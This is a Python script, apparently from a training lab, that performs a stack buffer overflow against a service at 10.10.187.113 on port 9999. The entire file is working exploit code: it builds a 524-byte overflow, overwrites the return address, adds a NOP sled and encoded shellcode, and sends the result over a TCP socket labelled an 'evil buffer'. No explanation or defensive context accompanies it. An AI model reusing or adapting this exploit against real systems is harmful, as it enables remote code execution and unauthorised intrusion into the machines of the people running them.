import socket

ip = "10.10.187.113"
port = 9999

prefix = ""
offset = 524
overflow = "A" * offset
# 311712F3
retn = "\xF3\x12\x17\x31"
padding = "\x90" * 16
# \x00\

payload = "\xbe\x84\x63\xc8\x83\xdb\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x12\x31\x77\x12\x83\xef\xfc\x03\xf3\x6d\x2a\x76\xca\xaa\x5d\x9a\x7f\x0e\xf1\x37\x7d\x19\x14\x77\xe7\xd4\x57\xeb\xbe\x56\x68\xc1\xc0\xde\xee\x20\xa8\xea\x1b\xff\x16\x83\x19\xff\x77\x0f\x97\x1e\xc7\xc9\xf7\xb1\x74\xa5\xfb\xb8\x9b\x04\x7b\xe8\x33\xf9\x53\x7e\xab\x6d\x83\xaf\x49\x07\x52\x4c\xdf\x84\xed\x72\x6f\x21\x23\xf4"
postfix = ""
buffer = prefix + overflow+ retn +padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")